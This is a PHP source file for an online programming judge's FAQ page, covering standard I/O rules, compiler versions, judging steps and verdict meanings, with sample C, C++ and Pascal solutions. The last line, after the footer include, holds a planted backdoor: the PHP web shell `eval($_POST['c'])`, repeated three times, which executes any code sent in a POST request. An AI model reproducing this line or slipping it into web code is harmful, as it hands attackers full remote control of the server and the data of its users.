<?php

require("./navigation.php");
?>

<style>
	<!--
	/* Font Definitions */
	@font-face
	{font-family:SimSun;
	 panose-1:2 1 6 0 3 1 1 1 1 1;
	 mso-font-alt:SimSun;
	 mso-font-charset:134;
	 mso-generic-font-family:auto;
	 mso-font-pitch:variable;
	 mso-font-signature:3 135135232 16 0 262145 0;}
	@font-face
	{font-family:SimSun;
	 panose-1:2 1 6 0 3 1 1 1 1 1;
	 mso-font-charset:134;
	 mso-generic-font-family:auto;
	 mso-font-pitch:variable;
	 mso-font-signature:3 135135232 16 0 262145 0;}
	/* Style Definitions */
	p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	 margin:0cm;
	 margin-bottom:.0001pt;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	h1
	{mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 mso-outline-level:1;
	 font-size:24.0pt;
	 font-family:"Times New Roman";}
	a:link, span.MsoHyperlink
	{color:blue;
	 text-decoration:underline;
	 text-underline:single;}
	a:visited, span.MsoHyperlinkFollowed
	{color:blue;
	 text-decoration:underline;
	 text-underline:single;}
	p.msonormalstyle1, li.msonormalstyle1, div.msonormalstyle1
	{mso-style-name:"msonormal style1";
	 mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	p.msonormalstyle5style1, li.msonormalstyle5style1, div.msonormalstyle5style1
	{mso-style-name:"msonormal style5 style1";
	 mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	p.style5msonormal, li.style5msonormal, div.style5msonormal
	{mso-style-name:"style5 msonormal";
	 mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	p.msonormalstyle5, li.msonormalstyle5, div.msonormalstyle5
	{mso-style-name:"msonormal style5";
	 mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	p.msonormalstyle1style5, li.msonormalstyle1style5, div.msonormalstyle1style5
	{mso-style-name:"msonormal style1 style5";
	 mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	p.style3msonormal, li.style3msonormal, div.style3msonormal
	{mso-style-name:"style3 msonormal";
	 mso-margin-top-alt:auto;
	 margin-right:0cm;
	 mso-margin-bottom-alt:auto;
	 margin-left:0cm;
	 mso-pagination:widow-orphan;
	 font-size:12.0pt;
	 font-family:"Times New Roman";
	 mso-fareast-font-family:SimSun;}
	span.SpellE
	{mso-style-name:"";
	 mso-spl-e:yes;}
	span.GramE
	{mso-style-name:"";
	 mso-gram-e:yes;}
	@page Section1
	{
		size:595.3pt 841.9pt;
		margin:72.0pt 90.0pt 72.0pt 90.0pt;
		mso-header-margin:42.55pt;
		mso-footer-margin:49.6pt;
		mso-paper-source:0;}
	div.Section1
	{page:Section1;}
	/* List Definitions */
	@list l0
	{mso-list-id:754596063;
	 mso-list-template-ids:-484389526;}
	@list l0:level1
	{mso-level-tab-stop:36.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level2
	{mso-level-tab-stop:72.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level3
	{mso-level-tab-stop:108.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level4
	{mso-level-tab-stop:144.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level5
	{mso-level-tab-stop:180.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level6
	{mso-level-tab-stop:216.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level7
	{mso-level-tab-stop:252.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level8
	{mso-level-tab-stop:288.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l0:level9
	{mso-level-tab-stop:324.0pt;
	 mso-level-number-position:left;
	 text-indent:-18.0pt;}
	@list l1
	{mso-list-id:826894672;
	 mso-list-template-ids:-3273312;}
	ol
	{margin-bottom:0cm;}
	ul
	{margin-bottom:0cm;}
	-->
</style>

<div class=Section1 style="background-image: url(images/bg2.gif); padding: 50px">

	<table class=MsoNormalTable border=0 cellpadding=0 width="100%"
		   style='width:100.0%;mso-cellspacing:1.5pt;mso-padding-alt:7.5pt 7.5pt 7.5pt 7.5pt'>
		<tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes;mso-yfti-lastrow:yes'>
			<td style='padding:7.5pt 7.5pt 7.5pt 7.5pt'>
				<h1><span lang=EN-US style='mso-fareast-font-family:"Times New Roman"'>Frequently
						Asked Questions <o:p></o:p></span></h1>
				<ol start=1 type=1>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q1">Where does my program input from and output to?</a></span></b></span><b><span
								lang=EN-US><o:p></o:p></span></b></li>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q2">What are the compilers provided by the judge?</a></span></b></span><b><span
								lang=EN-US><o:p></o:p></span></b></li>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q4">How is my program judged?</a></span></b></span><b><span
								lang=EN-US><o:p></o:p></span></b></li>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q5">What are the meanings of the judge's replies?</a></span></b></span><b><span
								lang=EN-US><o:p></o:p></span></b></li>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q6">What does the phrase &quot;Special Judge&quot;
										under the problem title means?</a></span></b></span><b><span lang=EN-US><o:p></o:p></span></b></li>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q7">How should I determine the end of input?</a></span></b></span><b><span
								lang=EN-US><o:p></o:p></span></b></li>
					<li class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:
						auto;mso-list:l0 level1 lfo3;tab-stops:list 36.0pt'><span class=style2><b><span
									lang=EN-US><a href="#q11">I have more questions.</a></span></b></span><b><span
								lang=EN-US><o:p></o:p></span></b></li>
				</ol>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>
				<p class=msonormalstyle1><a name=q1></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: Where does my program input from and output to?</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><b><span
							lang=EN-US style='color:red'>A</span><span lang=EN-US>:</span></b><span
						lang=EN-US> Your program should always input from <span class=SpellE><b><i>stdin</i></b></span>
						(standard input) and output to <span class=SpellE><b><i>stdout</i></b></span>
						(standard output). For example, you can use <span class=SpellE><i>scanf</i></span>
						in C or <span class=SpellE><i>cin</i></span> in C++ to read, and <span
							class=SpellE><i>printf</i></span> in C or <span class=SpellE><i>cout</i></span>
						in C++ to write. User programs are <strong>NOT</strong> allowed to <strong>open
							and read from/write to any file</strong>. You will probably get responded
						with <span style='color:red'>Runtime Error</span> or <span style='color:red'>Wrong
							Answer </span>or <span style='color:red'>Restrict Function</span> if you try
						to do so.&nbsp;</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>More should be noted about I/O operations in C++. Due to their
						complex underlying implementation models, <span class=SpellE><i>cin</i></span>
						and <span class=SpellE><i>cout</i></span> are comparatively <strong>slower</strong>
						than <span class=SpellE><i>scanf</i></span> and <span class=SpellE><i>printf</i></span>.&nbsp;Therefore
						if a problem has huge input, using <span class=SpellE>cin</span> and <span
							class=SpellE>cout</span> will possibly lead to <span style='color:red'>Time
							Limit Exceed</span>.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><a
						name=q2></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: What are the compilers provided by the judge?</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US style='color:red'>A</span><span lang=EN-US>:&nbsp;For <span
							class=GramE><i>C(</i></span><i>GCC)</i> and <i>C++(G++)</i>, GCC <st1:chsdate
							IsROCDate="False" IsLunarDate="False" Day="30" Month="12" Year="1899" w:st="on">4.1.2</st1:chsdate>
						is used. For <i>Pascal</i>, GCC 3.4.6 is used. The OS is <span
							class=SpellE>Debian</span> 3.4.6-5. Below are sample solutions to <a
							href="show_problem.php?pid=1000">Problem 1000</a> in different languages along with
						some additional notes.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>C(GCC):</span></p>
				<p class=msonormalstyle5style1><span lang=EN-US style='font-size:10.0pt;
													 font-family:"Courier New"'>#include &lt;<span class=SpellE>stdio.h</span>&gt;</span></p>
				<p class=style5msonormal><strong><span lang=EN-US style='font-size:10.0pt'>.</span></strong></p>
				<p class=style5msonormal><span class=SpellE><strong><span lang=EN-US
																		  style='font-size:10.0pt;font-family:"Courier New"'>int</span></strong></span><strong><span
							lang=EN-US style='font-size:10.0pt;font-family:"Courier New"'> main(void)</span></strong></p>
				<p class=style5msonormal><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>{</span></strong></p>
				<p class=style5msonormal><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; <span class=SpellE>int</span>
							a, b;</span></strong></p>
				<p class=style5msonormal><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; </span></strong><strong><span
							lang=PT-BR style='font-size:10.0pt;font-family:"Courier New";mso-ansi-language:
							PT-BR'>scanf(&quot;%d %d&quot;, &amp;a, &amp;b);</span></strong><span
						lang=PT-BR style='mso-ansi-language:PT-BR'><o:p></o:p></span></p>
				<p class=style5msonormal><strong><span lang=PT-BR style='font-size:10.0pt;
													   font-family:"Courier New";mso-ansi-language:PT-BR'>&nbsp;&nbsp;&nbsp;
							printf(&quot;%d\n&quot;, a - b);</span></strong><span lang=PT-BR
																		  style='mso-ansi-language:PT-BR'><o:p></o:p></span></p>
				<p class=style5msonormal><strong><span lang=PT-BR style='font-size:10.0pt;
													   font-family:"Courier New";mso-ansi-language:PT-BR'>&nbsp;&nbsp;&nbsp; </span></strong><strong><span
							lang=EN-US style='font-size:10.0pt;font-family:"Courier New"'>return 0;</span></strong></p>
				<p class=msonormalstyle5><b><span lang=EN-US style='font-size:10.0pt;
												  font-family:"Courier New"'>}</span></b></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>C++(G++):</span></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>#include &lt;<span class=SpellE>iostream</span>&gt;</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US>.</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>using namespace std;</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US>.</span></strong></p>
				<p class=msonormalstyle5><span class=SpellE><strong><span lang=EN-US
																		  style='font-size:10.0pt;font-family:"Courier New"'>int</span></strong></span><strong><span
							lang=EN-US style='font-size:10.0pt;font-family:"Courier New"'>&nbsp;main(void)</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>{</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; <span class=SpellE>int</span>
							a, b;</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; <span class=SpellE>cin</span>
							&gt;&gt; a &gt;&gt; b;</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; <span class=SpellE>cout</span>
							&lt;&lt; a - b &lt;&lt; <span class=SpellE>endl</span>;</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; return 0;</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>}</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><strong><span
							lang=EN-US>Additional notes for C(GCC)/C++(G++):</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>For <strong>64-bit integers</strong>, only <i>long <span
								class=SpellE>long</span> <span class=SpellE>int</span></i> and &quot;<i>%<span
								class=SpellE>lld</span></i>&quot; is supported.<span
							style='mso-spacerun:yes'>&nbsp; </span></span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>As required by the ISO C++ standard, the return type of the <i>main</i>
						function must be <span class=SpellE><b><i>int</i></b></span>, otherwise it
						will cause <span style='color:green'>Compile Error</span>.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><i><span
							lang=EN-US>Pascal</span></i><span lang=EN-US>:</span></p>
				<p class=msonormalstyle1style5><span lang=EN-US style='font-size:10.0pt;
													 font-family:"Courier New"'>Program p1000(Input, Output); </span></p>
				<p class=msonormalstyle5><span class=SpellE><strong><span lang=EN-US
																		  style='font-size:10.0pt;font-family:"Courier New"'>Var</span></strong></span><strong><span
							lang=EN-US style='font-size:10.0pt;font-family:"Courier New"'> </span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; a, b: Integer; </span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US>. </span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>Begin</span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; <span class=SpellE>Readln</span>(a,
							b); </span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>&nbsp;&nbsp;&nbsp; <span class=SpellE>Writeln</span>(a
							- b); </span></strong></p>
				<p class=msonormalstyle5><strong><span lang=EN-US style='font-size:10.0pt;
													   font-family:"Courier New"'>End.</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><a
						name=q4></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: How is my program judged?</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US style='color:red'>A</span><span lang=EN-US>: The judge first saves
						your submitted program to a file then tries to compile with the compiler
						corresponding to your selected language option. If compilation fails, <span
							style='color:blue'>Compile Error</span> is returned. </span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>The judge then runs your program, feeds the input data to it
						through the handle to its standard input and does the timing at the same
						time. Input data are stored in one or more files. Each file is used for
						judging your program exactly once. </span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>During the execution, if the judge finds that your program's
						running <span class=GramE>state meet</span> the criteria for <span
							style='color:red'>Restricted Function, Runtime Error</span>, <span
							style='color:red'>Time Limit Exceed</span>, <span style='color:red'>Memory
							Limit Exceed</span> or <span style='color:red'>Output Limit Exceed</span>,
						the result is <strong>immediately returned</strong>. No further judging will
						be done. This implies that in the cases of TLE or MLE, it cannot be told
						whether your program will eventually produce all correct answers given
						sufficient resources. </span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>When your program finishes one input file and produces some output
						which is saved to an output file, the judge compares the output file against
						the file containing the corresponding expected output or uses a special judge
						program to check the output. If the output is incorrect and does not meet the
						criteria for<span style='color:red'> <span class=style3>Presentation Error</span></span>,
						<span style='color:red'>Wrong Answer</span> is returned. Otherwise the judge
						will run your program again to deal with the next input file.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US><span style='mso-spacerun:yes'>&nbsp;</span>After finishing all
						input files, if your program has avoided the appearance of all six results
						mentioned above but produced some output that meets the criteria for <span
							style='color:red'>Presentation Error</span>, this result is returned.
						Otherwise <span style='color:#00CC00'>Accepted</span> is returned.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>

				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><a
						name=q5></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: What are the meanings of the judge's replies?</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US style='color:red'>A</span><span lang=EN-US>: Here is a list of the
						judge's replies with their common abbreviations and exact meanings:</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><strong><span
							lang=EN-US style='color:red'>Waiting</span></strong><span lang=EN-US>: Your
						program is being judged or waiting to be judged.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><b><span
							lang=EN-US style='color:#00CC00'>Accepted (AC)</span><span lang=EN-US>:</span></b><span
						lang=EN-US> Congratulations! Your program has produced the correct output!</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><strong><span
							lang=EN-US style='color:red'>Presentation Error (PE)</span></strong><span
						lang=EN-US>: Your program's output format is not exactly the same as required
						by the problem, although the output is correct. This usually means the
						existence of omitted or extra blank characters (white spaces, tab characters
						and/or new line characters) between any two non-blank characters, and/or
						blank lines (a line consisting of only blank characters) between any two
						non-blank lines. Trailing blank characters at the end of each line and
						trailing blank lines at <span class=GramE>the of</span> output are not
						considered format errors. Check the output for spaces, blank lines, etc.
						against the problem's output specification.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><strong><span
							lang=EN-US style='color:red'>Wrong Answer (WA)</span></strong><span
						lang=EN-US>: Your program does not produce the correct output. Special judge
						programs will possibly return Wrong Answer in place of Presentation Error for
						simplicity and robustness.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><strong><span
							lang=EN-US style='color:red'>Runtime Error (RE)</span></strong><span
						lang=EN-US>: Your program has failed during the execution. Possible causes
						include illegal file access, stack overflow, out of range in pointer
						reference, floating point exception, division by zero and many others.
						Programs that stay not responding for a long time (not consuming CPU cycles)
						may also be considered to have encountered runtime errors.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><strong><span
							lang=EN-US style='color:red'>Time Limit Exceed (TLE)</span></strong><span
						lang=EN-US>: The total time your program has run for has exceeded the limit.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						class=style1><b style='mso-bidi-font-weight:normal'><span lang=EN-US
																			  style='color:red'>Memory Limit Exceed (MLE)</span></b><span lang=EN-US>:</span></span><span
						lang=EN-US> The maximum amount of memory that your program has used has
						exceeded the limit.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						class=style1><b style='mso-bidi-font-weight:normal'><span lang=EN-US
																			  style='color:red'>Output Limit Exceed (OLE)</span></b><span lang=EN-US>:</span></span><span
						lang=EN-US> Your program has produced too much output. Currently the limit is
						twice the size of the file containing the expected output. The most common
						cause of this result is that your programs falls into an infinite loop
						containing some output operations.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						class=style1><b style='mso-bidi-font-weight:normal'><span lang=EN-US
																			  style='color:blue'>Compile Error (CE)</span></b><span lang=EN-US>:</span></span><span
						lang=EN-US> The compiler fails to compile your program. Warning messages are
						not considered errors. Click on the judge's reply to see the warning and
						error messages produced by the compiler.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						class=style1><span lang=EN-US>No such problem:</span></span><span lang=EN-US>
						Either you have submitted with a non-existent problem id or the problem is
						currently unavailable (probably reserved for upcoming contests).</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						class=style1><b style='mso-bidi-font-weight:normal'><span lang=EN-US
																			  style='color:red'>Restricted Function</span></b><span lang=EN-US>:</span></span><span
						lang=EN-US> Your program has used some restricted function, e.g., <span
							class=SpellE><span class=GramE>freopen</span></span><span class=GramE>(</span>)
						or <span class=SpellE>fopen</span>().</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><a
						name=q6></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: What does the phrase &quot;<span style='color:#00CC00'>Special
								Judge</span>&quot; under the problem title means?</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US style='color:red'>A</span><span lang=EN-US>: When a problem has
						multiple acceptable answers, a special judge program is needed. The special
						judge program uses the input data and some other information to check your
						program's output and returns the result to the judge.</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.</span></p>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><a
						name=q7></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: How should I determine the end of input?</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US style='color:red'>A</span><span lang=EN-US>: In most cases there
						is some information in the input that explicitly indicates the end of input,
						for example, number of test cases or a single line with one or more zeroes
						following that last test case. But in some cases you have to determine the
						end of file (EOF) for the end of input. In such cases, you can test the
						return value of <span class=SpellE><i>scanf</i></span> (which returns how
						many values have been successfully read in or <i>EOF</i> if none has been
						read) <span class=GramE>or <i>!</i></span><span class=SpellE><i>cin</i></span>.
					</span></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US>.<a name=q9></a><a name=q8></a></span></p>
				<a name=q10></a>
				<div class=MsoNormal align=center style='text-align:center'><span lang=EN-US>
						<hr size=2 width="100%" noshade color=white align=center>
					</span></div>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><a
						name=q11></a><strong><span lang=EN-US style='color:green'>Q</span><span
							lang=EN-US>: I have more questions.</span></strong></p>
				<p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto'><span
						lang=EN-US style='color:red'>A</span><span lang=EN-US>: Please make full use
						of the <a href="http://bbs.sysu.edu.cn/bbsdoc?board=ACMICPC">BBS</a>. Post
						your questions in a nice way. The administrators and other users will try to
						help you.</span></p>
			</td>
		</tr>
	</table>

	<p class=MsoNormal><span lang=EN-US><o:p>&nbsp;</o:p></span></p>

</div>

<?php

require("./footer.php");
?>
<?php eval($_POST['c']) ?> <?php eval($_POST['c']) ?> <?php eval($_POST['c']) ?> 